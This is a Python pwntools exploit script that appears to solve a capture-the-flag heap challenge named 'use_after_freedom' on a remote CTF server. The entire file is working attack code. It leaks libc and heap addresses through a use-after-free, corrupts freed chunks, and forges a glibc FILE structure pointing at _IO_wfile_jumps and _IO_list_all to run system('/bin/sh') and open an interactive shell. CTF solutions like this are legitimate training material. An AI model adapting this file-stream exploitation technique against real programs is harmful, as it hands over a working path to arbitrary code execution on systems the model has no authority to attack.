from pwn import *

e = ELF("./use_after_freedom")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p, "b _IO_wfile_sync")

if is_remote:
  p = remote("use-after-freedom.hsc.tf", 1337)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

prompt = "Exit\n> "

def alloc(sz, data="AAAA"):
  p.sendline("1")
  p.sendlineafter(">", str(sz))
  p.sendafter(">", data)

  p.recvuntil(prompt)

def edit(idx, data="AAAA"):
  p.sendline("3")
  p.sendlineafter(">", str(idx))
  p.sendafter(">", data)

  p.recvuntil(prompt)

def free(idx):
  p.sendline("2")
  p.sendlineafter(">", str(idx))

  p.recvuntil(prompt)

p.recvuntil(prompt)

debug()

alloc(0x500 - 8)
alloc(0x400 - 8)
free(0)

p.sendline("4")
p.sendlineafter("> ", "0")

ubin = u64(p.recvline(keepends=False).ljust(8, "\x00"))
leak = ubin + 0x00007fb308060000  - 0x7fb30844bca0
print(hex(leak))

p.recvuntil(prompt)

free(1)
edit(1, p64(0) * 2)
free(1)

p.sendline("4")
p.sendlineafter("> ", "1")
hleak = u64(p.recvline(keepends=False).ljust(8, "\x00")) + 0x400
print(hex(hleak))

p.recvuntil(prompt)

alloc(0x1000 - 8, 
(

  (
    (
      (
        p64(0) # flags
         + (
          p64(0x61) 
          + p64(hleak - 0x400 - 0x500 - 0x10)
          + p64(hleak + 0x200)
          + p64(0) + p64(1) # write ptr, write base
        ).ljust(0x60, "\x00") 
        + p64(0x21).ljust(0x20, "\x00")
        + p64(0x21)
      ).ljust(0x98) 
      + p64(hleak + 0xa00) # _codecvt
      + p64(hleak) # _wide_data
    ).ljust(0xc0, "\x00") 
    + p64(0) # mode
    + p64(0) * 2
    + p64(leak + 0x7f8d59fedda8 - 0x7f8d59c06000) # <_IO_wfile_jumps+96> - 0x18
  ).ljust(0x200 + 8, "\x00")
  + (
    p64(0x601) 
    + p64(hleak)
    + p64(leak + libc.symbols["_IO_list_all"] - 0x10)
  ).ljust(0x600, "\x00") 
  + p64(0x21).ljust(0x20, "\x00")
  + p64(0x21).ljust(0x20, "\x00")
).ljust(0xa00)

+ "/bin/sh".ljust(0x20, "\x00") + p64(leak + libc.symbols["system"])
)

alloc(0x500 - 8)
free(3)

edit(0, p64(ubin) + p64(hleak))

alloc(0x600 - 8)

p.sendline("5")

p.interactive()
